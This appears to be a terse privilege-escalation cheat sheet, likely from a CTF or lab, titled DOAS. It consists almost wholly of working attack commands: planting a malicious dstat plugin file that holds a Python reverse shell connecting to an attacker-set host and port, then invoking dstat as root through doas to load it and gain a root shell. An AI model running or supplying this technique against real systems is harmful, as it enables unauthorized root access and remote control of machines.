# DOAS

```
cd /usr/local/share/dstat
```

```
nano dstat_rfs.py
import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
```

```
doas -u root /usr/bin/dstat --list

doas -u root /usr/bin/dstat --rfs
```
